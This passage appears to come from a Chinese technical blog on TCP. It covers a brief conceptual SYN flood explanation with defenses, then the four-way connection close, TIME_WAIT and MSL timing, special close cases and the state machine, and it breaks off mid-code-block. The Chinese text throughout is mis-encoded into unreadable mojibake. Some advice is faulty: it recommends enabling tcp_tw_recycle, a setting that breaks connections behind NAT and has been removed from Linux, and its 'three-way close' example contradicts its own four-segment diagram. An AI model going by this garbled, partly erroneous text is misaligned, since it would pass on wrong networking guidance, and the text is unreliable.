class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">æ”»å‡»åŸç†ï¼š<br>1. æ”»å‡»è€…å‘é€å¤§é‡SYNè¯·æ±‚<br>2. ä½¿ç”¨ä¼ªé€ çš„æºIPåœ°å€<br>3. æœåŠ¡å™¨å›å¤SYN+ACKåˆ°ä¸å­˜åœ¨çš„åœ°å€<br>4. æœåŠ¡å™¨ç»´æŠ¤å¤§é‡åŠå¼€è¿æ¥ï¼ˆSYN_RCVDçŠ¶æ€ï¼‰<br>5. è€—å°½æœåŠ¡å™¨èµ„æº<br><br>é˜²æŠ¤æªæ–½ï¼š<br><span class="hljs-bullet">- </span>SYN CookieæŠ€æœ¯<br><span class="hljs-bullet">- </span>é™åˆ¶SYNè¯·æ±‚é€Ÿç‡<br><span class="hljs-bullet">- </span>å‡å°‘è¶…æ—¶æ—¶é—´<br><span class="hljs-bullet">- </span>å¢åŠ åŠè¿æ¥é˜Ÿåˆ—å¤§å°<br></code></pre></td></tr></table></figure><hr><h2 id="4-TCPå››æ¬¡æŒ¥æ‰‹"><a href="#4-TCPå››æ¬¡æŒ¥æ‰‹" class="headerlink" title="4. TCPå››æ¬¡æŒ¥æ‰‹"></a>4. TCPå››æ¬¡æŒ¥æ‰‹</h2><h3 id="4-1-ä¸ºä»€ä¹ˆéœ€è¦å››æ¬¡æŒ¥æ‰‹ï¼Ÿ"><a href="#4-1-ä¸ºä»€ä¹ˆéœ€è¦å››æ¬¡æŒ¥æ‰‹ï¼Ÿ" class="headerlink" title="4.1 ä¸ºä»€ä¹ˆéœ€è¦å››æ¬¡æŒ¥æ‰‹ï¼Ÿ"></a>4.1 ä¸ºä»€ä¹ˆéœ€è¦å››æ¬¡æŒ¥æ‰‹ï¼Ÿ</h3><p><strong>æ ¸å¿ƒåŸå› </strong>ï¼šTCPæ˜¯<strong>å…¨åŒå·¥</strong>é€šä¿¡ï¼ŒåŒæ–¹éƒ½éœ€è¦ç‹¬ç«‹å…³é—­è‡ªå·±çš„å‘é€é€šé“ã€‚</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 1c">å»ºç«‹è¿æ¥ï¼šæ¡æ‰‹ï¼ˆå•å‘ï¼Œä¸€èµ·å»ºç«‹ï¼‰<br>å…³é—­è¿æ¥ï¼šæŒ¥æ‰‹ï¼ˆåŒå‘ï¼Œç‹¬ç«‹å…³é—­ï¼‰<br><br>ç±»æ¯”ï¼š<br>å»ºç«‹ç”µè¯ï¼šåŒæ–¹åŒæ—¶å‡†å¤‡å¥½å°±è¡Œ<br>æŒ‚æ–­ç”µè¯ï¼šæ¯ä¸ªäººéƒ½è¦è¯´<span class="hljs-string">&quot;å†è§&quot;</span>å¹¶ç¡®è®¤<br></code></pre></td></tr></table></figure><h3 id="4-2-å››æ¬¡æŒ¥æ‰‹è¯¦ç»†è¿‡ç¨‹"><a href="#4-2-å››æ¬¡æŒ¥æ‰‹è¯¦ç»†è¿‡ç¨‹" class="headerlink" title="4.2 å››æ¬¡æŒ¥æ‰‹è¯¦ç»†è¿‡ç¨‹"></a>4.2 å››æ¬¡æŒ¥æ‰‹è¯¦ç»†è¿‡ç¨‹</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">å®¢æˆ·ç«¯                                          æœåŠ¡å™¨<br>ESTABLISHED                              ESTABLISHED<br>  |<span class="hljs-string">                                                </span>|<br>  |<span class="hljs-string">  â‘  FIN=1, SEQ=u                               </span>|<br>  |<span class="hljs-string">  &quot;æˆ‘æ²¡æœ‰æ•°æ®è¦å‘é€äº†ï¼Œå‡†å¤‡å…³é—­&quot;                 </span>|<br>  |<span class="hljs-string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;</span>|<br>  |<span class="hljs-string">                                                </span>|<br>FIN_WAIT_1                                        |<span class="hljs-string"></span><br><span class="hljs-string">  </span>|<span class="hljs-string">                                                </span>|<br>  |<span class="hljs-string">  â‘¡ ACK=1, SEQ=v, ACK_NUM=u+1                  </span>|<br>  |<span class="hljs-string">  &quot;å¥½çš„ï¼Œæˆ‘çŸ¥é“äº†ã€‚ä½†æˆ‘å¯èƒ½è¿˜æœ‰æ•°æ®è¦å‘é€&quot;        </span>|<br>  |<span class="hljs-string">&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>|<br>  |<span class="hljs-string">                                          CLOSE_WAIT</span><br><span class="hljs-string">FIN_WAIT_2                                        </span>|<br>  |<span class="hljs-string">                                                </span>|<br>  |<span class="hljs-string">            æœåŠ¡å™¨ç»§ç»­å‘é€æ•°æ®...                </span>|<br>  |<span class="hljs-string">&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>|<br>  |<span class="hljs-string">                                                </span>|<br>  |<span class="hljs-string">  â‘¢ FIN=1, ACK=1, SEQ=w, ACK_NUM=u+1           </span>|<br>  |<span class="hljs-string">  &quot;å¥½äº†ï¼Œæˆ‘çš„æ•°æ®ä¹Ÿå‘é€å®Œäº†ï¼Œå¯ä»¥å…³é—­äº†&quot;          </span>|<br>  |<span class="hljs-string">&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>|<br>  |<span class="hljs-string">                                          LAST_ACK</span><br><span class="hljs-string">TIME_WAIT                                         </span>|<br>  |<span class="hljs-string">                                                </span>|<br>  |<span class="hljs-string">  â‘£ ACK=1, SEQ=u+1, ACK_NUM=w+1                </span>|<br>  |<span class="hljs-string">  &quot;æ”¶åˆ°ï¼Œå†è§ï¼&quot;                                </span>|<br>  |<span class="hljs-string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;</span>|<br>  |<span class="hljs-string">                                                </span>|<br>  |<span class="hljs-string">                                            CLOSED</span><br><span class="hljs-string">  </span>|<span class="hljs-string">  (ç­‰å¾…2MSLæ—¶é—´)                               </span>|<br>  |<span class="hljs-string">                                                </span>|<br>CLOSED                                            |<br></code></pre></td></tr></table></figure><p><strong>ç¬¬ä¸€æ¬¡æŒ¥æ‰‹ï¼ˆå®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼‰</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">TCPæ ‡å¿—ï¼šFIN = 1, ACK = 1<br>åºåˆ—å·ï¼š  SEQ = u<br>ç¡®è®¤å·ï¼š  ACK_NUM = v<br><br>å®¢æˆ·ç«¯çŠ¶æ€ï¼šESTABLISHED â†’ FIN_WAIT_1<br>æœåŠ¡å™¨çŠ¶æ€ï¼šESTABLISHEDï¼ˆä¿æŒä¸å˜ï¼‰<br><br>å«ä¹‰ï¼š<br><span class="hljs-bullet">- </span>å®¢æˆ·ç«¯å‘Šè¯‰æœåŠ¡å™¨ï¼š&quot;æˆ‘æ²¡æœ‰æ•°æ®è¦å‘é€äº†&quot;<br><span class="hljs-bullet">- </span>å®¢æˆ·ç«¯è¿›å…¥ä¸»åŠ¨å…³é—­çŠ¶æ€<br><span class="hljs-bullet">- </span>ä½†å®¢æˆ·ç«¯ä»å¯ä»¥æ¥æ”¶æ•°æ®<br></code></pre></td></tr></table></figure><p><strong>ç¬¬äºŒæ¬¡æŒ¥æ‰‹ï¼ˆæœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯ï¼‰</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">TCPæ ‡å¿—ï¼šACK = 1<br>åºåˆ—å·ï¼š  SEQ = v<br>ç¡®è®¤å·ï¼š  ACK_NUM = u + 1<br><br>å®¢æˆ·ç«¯çŠ¶æ€ï¼šFIN<span class="hljs-emphasis">_WAIT_1 â†’ FIN_WAIT_2</span><br><span class="hljs-emphasis">æœåŠ¡å™¨çŠ¶æ€ï¼šESTABLISHED â†’ CLOSE_</span>WAIT<br><br>å«ä¹‰ï¼š<br><span class="hljs-bullet">- </span>æœåŠ¡å™¨ç¡®è®¤æ”¶åˆ°å®¢æˆ·ç«¯çš„FIN<br><span class="hljs-bullet">- </span>æœåŠ¡å™¨å¯èƒ½è¿˜æœ‰æ•°æ®è¦å‘é€<br><span class="hljs-bullet">- </span>æœåŠ¡å™¨åˆ°å®¢æˆ·ç«¯çš„æ–¹å‘è¿˜æœªå…³é—­<br></code></pre></td></tr></table></figure><p><strong>ç¬¬ä¸‰æ¬¡æŒ¥æ‰‹ï¼ˆæœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯ï¼‰</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">TCPæ ‡å¿—ï¼šFIN = 1, ACK = 1<br>åºåˆ—å·ï¼š  SEQ = w<br>ç¡®è®¤å·ï¼š  ACK_NUM = u + 1<br><br>å®¢æˆ·ç«¯çŠ¶æ€ï¼šFIN<span class="hljs-emphasis">_WAIT_2ï¼ˆä¿æŒä¸å˜ï¼‰</span><br><span class="hljs-emphasis">æœåŠ¡å™¨çŠ¶æ€ï¼šCLOSE_WAIT â†’ LAST_</span>ACK<br><br>å«ä¹‰ï¼š<br><span class="hljs-bullet">- </span>æœåŠ¡å™¨æ•°æ®å‘é€å®Œæ¯•<br><span class="hljs-bullet">- </span>æœåŠ¡å™¨è¯·æ±‚å…³é—­è¿æ¥<br><span class="hljs-bullet">- </span>ç­‰å¾…å®¢æˆ·ç«¯æœ€åçš„ç¡®è®¤<br></code></pre></td></tr></table></figure><p><strong>ç¬¬å››æ¬¡æŒ¥æ‰‹ï¼ˆå®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼‰</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">TCPæ ‡å¿—ï¼šACK = 1<br>åºåˆ—å·ï¼š  SEQ = u + 1<br>ç¡®è®¤å·ï¼š  ACK_NUM = w + 1<br><br>å®¢æˆ·ç«¯çŠ¶æ€ï¼šFIN<span class="hljs-emphasis">_WAIT_2 â†’ TIME_WAIT â†’ CLOSED</span><br><span class="hljs-emphasis">æœåŠ¡å™¨çŠ¶æ€ï¼šLAST_</span>ACK â†’ CLOSED âœ…<br><br>å«ä¹‰ï¼š<br><span class="hljs-bullet">- </span>å®¢æˆ·ç«¯ç¡®è®¤æ”¶åˆ°æœåŠ¡å™¨çš„FIN<br><span class="hljs-bullet">- </span>æœåŠ¡å™¨æ”¶åˆ°åç«‹å³å…³é—­<br><span class="hljs-bullet">- </span>å®¢æˆ·ç«¯ç­‰å¾…2MSLæ—¶é—´åå…³é—­<br></code></pre></td></tr></table></figure><h3 id="4-3-TIME-WAITçŠ¶æ€"><a href="#4-3-TIME-WAITçŠ¶æ€" class="headerlink" title="4.3 TIME_WAITçŠ¶æ€"></a>4.3 TIME_WAITçŠ¶æ€</h3><p><strong>ä¸ºä»€ä¹ˆéœ€è¦TIME_WAITï¼Ÿ</strong></p><p>å®¢æˆ·ç«¯åœ¨å‘é€æœ€åä¸€ä¸ªACKåä¸ç«‹å³å…³é—­ï¼Œè€Œæ˜¯ç­‰å¾…**2MSLï¼ˆMaximum Segment Lifetimeï¼‰**æ—¶é—´ã€‚</p><p><strong>åŸå› 1ï¼šç¡®ä¿æœ€åçš„ACKè¢«æœåŠ¡å™¨æ”¶åˆ°</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åœºæ™¯ï¼š<br><span class="hljs-bullet">1.</span> å®¢æˆ·ç«¯å‘é€æœ€åçš„ACK<br><span class="hljs-bullet">2.</span> ACKåœ¨ç½‘ç»œä¸­ä¸¢å¤±<br><span class="hljs-bullet">3.</span> æœåŠ¡å™¨è¶…æ—¶é‡ä¼ FIN<br><span class="hljs-bullet">4.</span> å¦‚æœå®¢æˆ·ç«¯å·²å…³é—­ï¼Œæ— æ³•å“åº”<br><span class="hljs-bullet">5.</span> æœåŠ¡å™¨ä¼šè®¤ä¸ºè¿æ¥å¼‚å¸¸<br><br>è§£å†³ï¼š<br>å®¢æˆ·ç«¯ç­‰å¾…2MSL<br>å¦‚æœæ”¶åˆ°é‡ä¼ çš„FINï¼Œé‡æ–°å‘é€ACK<br></code></pre></td></tr></table></figure><p><strong>åŸå› 2ï¼šç¡®ä¿æ—§è¿æ¥çš„æ•°æ®åŒ…æ¶ˆå¤±</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åœºæ™¯ï¼š<br><span class="hljs-bullet">1.</span> æ—§è¿æ¥å…³é—­<br><span class="hljs-bullet">2.</span> ç«‹å³ç”¨ç›¸åŒçš„å››å…ƒç»„å»ºç«‹æ–°è¿æ¥<br><span class="hljs-bullet">3.</span> æ—§è¿æ¥çš„å»¶è¿Ÿæ•°æ®åŒ…åˆ°è¾¾<br><span class="hljs-bullet">4.</span> æ–°è¿æ¥æ”¶åˆ°æ—§æ•°æ®ï¼Œå¯¼è‡´æ··ä¹±<br><br>è§£å†³ï¼š<br>ç­‰å¾…2MSLï¼Œç¡®ä¿æ‰€æœ‰æ•°æ®åŒ…éƒ½æ¶ˆå¤±<br>(1 MSLå»ç¨‹ + 1 MSLå›ç¨‹)<br></code></pre></td></tr></table></figure><p><strong>MSLæ—¶é—´</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">RFCå®šä¹‰ï¼š2åˆ†é’Ÿ<br>Linuxé»˜è®¤ï¼š60ç§’ï¼ˆå¯è°ƒæ•´ï¼‰<br>Windowsï¼š4åˆ†é’Ÿ<br><br>2MSLï¼š<br><span class="hljs-bullet">- </span>Linux: 120ç§’<br><span class="hljs-bullet">- </span>Windows: 240ç§’<br></code></pre></td></tr></table></figure><p><strong>TIME_WAITè¿‡å¤šçš„é—®é¢˜</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ç°è±¡ï¼š<br>netstat -an | grep TIME<span class="hljs-emphasis">_WAIT | wc -l</span><br><span class="hljs-emphasis">æ˜¾ç¤ºå¤§é‡TIME_</span>WAITè¿æ¥<br><br>å½±å“ï¼š<br><span class="hljs-bullet">- </span>å ç”¨ç«¯å£ï¼ˆå®¢æˆ·ç«¯ç«¯å£æœ‰é™ï¼‰<br><span class="hljs-bullet">- </span>å ç”¨ç³»ç»Ÿèµ„æº<br><br>è§£å†³æ–¹æ¡ˆï¼š<br>1. å¯ç”¨SO<span class="hljs-emphasis">_REUSEADDRé€‰é¡¹</span><br><span class="hljs-emphasis">2. è°ƒæ•´å†…æ ¸å‚æ•°ï¼š</span><br><span class="hljs-emphasis">   net.ipv4.tcp_tw_reuse = 1</span><br><span class="hljs-emphasis">   net.ipv4.tcp_tw_</span>recycle = 1<br>3. å‡å°‘MSLæ—¶é—´ï¼ˆéœ€è°¨æ…ï¼‰<br>4. ä½¿ç”¨è¿æ¥æ± å¤ç”¨è¿æ¥<br></code></pre></td></tr></table></figure><h3 id="4-4-å››æ¬¡æŒ¥æ‰‹çš„ç‰¹æ®Šæƒ…å†µ"><a href="#4-4-å››æ¬¡æŒ¥æ‰‹çš„ç‰¹æ®Šæƒ…å†µ" class="headerlink" title="4.4 å››æ¬¡æŒ¥æ‰‹çš„ç‰¹æ®Šæƒ…å†µ"></a>4.4 å››æ¬¡æŒ¥æ‰‹çš„ç‰¹æ®Šæƒ…å†µ</h3><p><strong>æƒ…å†µ1ï¼šä¸‰æ¬¡æŒ¥æ‰‹ï¼ˆåŒæ—¶å…³é—­ï¼‰</strong></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">åœºæ™¯ï¼šåŒæ–¹åŒæ—¶å‘é€FIN<br><br>å®¢æˆ·ç«¯                      æœåŠ¡å™¨<br>   |<span class="hljs-string">         FIN             </span>|<br>   |<span class="hljs-string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;</span>|<br>   |<span class="hljs-string">         FIN             </span>|<br>   |<span class="hljs-string">&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>|<br>   |<span class="hljs-string">         ACK             </span>|<br>   |<span class="hljs-string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;</span>|<br>   |<span class="hljs-string">         ACK             </span>|<br>   |<span class="hljs-string">&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>|<br><br>ç»“æœï¼šåªéœ€è¦3æ¬¡æ¡æ‰‹ï¼ˆä¸¤ä¸ªFIN + ä¸¤ä¸ªACKï¼‰<br></code></pre></td></tr></table></figure><p><strong>æƒ…å†µ2ï¼šå¼‚å¸¸å…³é—­ï¼ˆRSTï¼‰</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å‘é€RSTçš„æƒ…å†µï¼š<br><span class="hljs-bullet">1.</span> è¿æ¥ä¸å­˜åœ¨æ—¶æ”¶åˆ°éSYNåŒ…<br><span class="hljs-bullet">2.</span> è¿æ¥é˜Ÿåˆ—æº¢å‡º<br><span class="hljs-bullet">3.</span> ç«¯å£æœªç›‘å¬<br><span class="hljs-bullet">4.</span> åº”ç”¨ç¨‹åºè°ƒç”¨close()æ—¶è¿˜æœ‰æœªè¯»æ•°æ®<br><br>RSTç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">-</span> ç«‹å³å…³é—­è¿æ¥<br><span class="hljs-bullet">-</span> ä¸ç»è¿‡TIME<span class="hljs-emphasis">_WAIT</span><br><span class="hljs-emphasis">- æ¥æ”¶æ–¹ä¸å‘é€ACK</span><br></code></pre></td></tr></table></figure><hr><h2 id="5-TCPçŠ¶æ€æœº"><a href="#5-TCPçŠ¶æ€æœº" class="headerlink" title="5. TCPçŠ¶æ€æœº"></a>5. TCPçŠ¶æ€æœº</h2><h3 id="5-1-å®Œæ•´çš„TCPçŠ¶æ€è½¬æ¢å›¾"><a href="#5-1-å®Œæ•´çš„TCPçŠ¶æ€è½¬æ¢å›¾" class="headerlink" title="5.1 å®Œæ•´çš„TCPçŠ¶æ€è½¬æ¢å›¾"></a>5.1 å®Œæ•´çš„TCPçŠ¶æ€è½¬æ¢å›¾</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                     CLOSED<br>                       |<span class="hljs-string"></span><br><span class="hljs-string">                       </span>|<span class="hljs-string"> (è¢«åŠ¨æ‰“å¼€/listen)</span><br><span class="hljs-string">                       â†“</span><br><span class="hljs-string">                     LISTEN â†â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="hljs-string">                       </span>|<span class="hljs-string">                 â”‚</span><br><span class="hljs-string">   (ä¸»åŠ¨æ‰“å¼€/connect)  </span>|<span class="hljs-string">                 â”‚</span><br><span class="hljs-string">         â†“             </span>|<span class="hljs-string">                 â”‚</span><br><span class="hljs-string">      SYN_SENT         </span>|<span class="hljs-string"> æ”¶åˆ°SYN          â”‚</span><br><span class="hljs-string">         </span>|<span class="hljs-string">             </span>|<span class="hljs-string"> å‘é€SYN+ACK      â”‚</span><br><span class="hljs-string">æ”¶åˆ°SYN+ACK</span>|<span class="hljs-string">           â†“                 â”‚</span><br><span class="hljs-string">å‘é€ACK    </span>|<span class="hljs-string">        SYN_RCVD              â”‚</span><br><span class="hljs-string">         â†“             </span>|<span class="hljs-string">                 â”‚</span><br><span class="hljs-string">         â””â”€â”€â”€â”€â”€â†’ ESTABLISHED â†â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="hljs-string">                     </span>|<span class="hljs-string">   </span>|<br>         (ä¸»åŠ¨å…³é—­)  |<span class="hljs-string">   </span>|<span class="hljs-string"> (è¢«åŠ¨å…³é—­)</span><br><span class="hljs-string">         å‘é€FIN     </span>|<span class="hljs-string">   </span>|<span class="hljs-string"> æ”¶åˆ°FIN</span><br><span class="hljs-string">                     </span>|<span class="hljs-string">   </span>|<span class="hljs-string"> å‘é€ACK</span><br><span class="hljs-string">                     â†“   â†“</span><br><span class="hljs-string">               FIN_WAIT_1  CLOSE_WAIT</span><br><span class="hljs-string">                     </span>|<span class="hljs-string">        </span>|<br>         æ”¶åˆ°ACK     |<span class="hljs-string">        </span>|<span class="hljs-string"> (åº”ç”¨å±‚å…³é—­)</span><br><span class="hljs-string">                     </span>|<span class="hljs-string">        </span>|<span class="hljs-string"> å‘é€FIN</span><br><span class="hljs-string">                     â†“        â†“</span><br><span class="hljs-string">               FIN_WAIT_2  LAST_ACK</span><br><span class="hljs-string">                     </span>|<span class="hljs-string">        </span>|<br>         æ”¶åˆ°FIN     |<span class="hljs-string">        </span>|<span class="hljs-string"> æ”¶åˆ°ACK</span><br><span class="hljs-string">         å‘é€ACK     </span>|<span class="hljs-string">        </span>|<br>                     â†“        â†“<br>                TIME_WAIT  CLOSED<br>                     |<span class="hljs-string"></span><br><span class="hljs-string">          (ç­‰å¾…2MSL) </span>|<br>                     â†“<br>                  CLOSED<br></code></pre></td></tr></table></figure><h3 id="5-2-11ç§TCPçŠ¶æ€è¯¦è§£"><a href="#5-2-11ç§TCPçŠ¶æ€è¯¦è§£" class="headerlink" title="5.2 11ç§TCPçŠ¶æ€è¯¦è§£"></a>5.2 11ç§TCPçŠ¶æ€è¯¦è§£</h3><table><thead><tr><th>çŠ¶æ€</th><th>è¯´æ˜</th><th>æ‰€å¤„é˜¶æ®µ</th></tr></thead><tbody><tr><td><strong>CLOSED</strong></td><td>å…³é—­çŠ¶æ€ï¼Œæ— è¿æ¥</td><td>åˆå§‹&#x2F;ç»“æŸ</td></tr><tr><td><strong>LISTEN</strong></td><td>ç›‘å¬çŠ¶æ€ï¼Œç­‰å¾…è¿æ¥</td><td>æœåŠ¡å™¨</td></tr><tr><td><strong>SYN_SENT</strong></td><td>å‘é€SYNåï¼Œç­‰å¾…SYN+ACK</td><td>å®¢æˆ·ç«¯ä¸‰æ¬¡æ¡æ‰‹</td></tr><tr><td><strong>SYN_RCVD</strong></td><td>æ”¶åˆ°SYNï¼Œå‘é€SYN+ACKï¼Œç­‰å¾…ACK</td><td>æœåŠ¡å™¨ä¸‰æ¬¡æ¡æ‰‹</td></tr><tr><td><strong>ESTABLISHED</strong></td><td>è¿æ¥å»ºç«‹ï¼Œå¯ä»¥ä¼ è¾“æ•°æ®</td><td>æ•°æ®ä¼ è¾“</td></tr><tr><td><strong>FIN_WAIT_1</strong></td><td>ä¸»åŠ¨å…³é—­ï¼Œå‘é€FINï¼Œç­‰å¾…ACKæˆ–FIN</td><td>ä¸»åŠ¨å…³é—­æ–¹</td></tr><tr><td><strong>FIN_WAIT_2</strong></td><td>æ”¶åˆ°å¯¹æ–¹ACKï¼Œç­‰å¾…å¯¹æ–¹FIN</td><td>ä¸»åŠ¨å…³é—­æ–¹</td></tr><tr><td><strong>TIME_WAIT</strong></td><td>æ”¶åˆ°FINï¼Œå‘é€ACKï¼Œç­‰å¾…2MSL</td><td>ä¸»åŠ¨å…³é—­æ–¹</td></tr><tr><td><strong>CLOSE_WAIT</strong></td><td>æ”¶åˆ°å¯¹æ–¹FINï¼Œå‘é€ACKï¼Œç­‰å¾…å…³é—­</td><td>è¢«åŠ¨å…³é—­æ–¹</td></tr><tr><td><strong>LAST_ACK</strong></td><td>å‘é€FINï¼Œç­‰å¾…æœ€åçš„ACK</td><td>è¢«åŠ¨å…³é—­æ–¹</td></tr><tr><td><strong>CLOSING</strong></td><td>åŒæ–¹åŒæ—¶å…³é—­ï¼Œç­‰å¾…ACK</td><td>åŒæ—¶å…³é—­</td></tr></tbody></table><h3 id="5-3-æŸ¥çœ‹TCPè¿æ¥çŠ¶æ€"><a href="#5-3-æŸ¥çœ‹TCPè¿æ¥çŠ¶æ€" class="headerlink" title="5.3 æŸ¥çœ‹TCPè¿æ¥çŠ¶æ€"></a>5.3 æŸ¥çœ‹TCPè¿æ¥çŠ¶æ€</h3><p><strong>Linux&#x2F;Mac</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 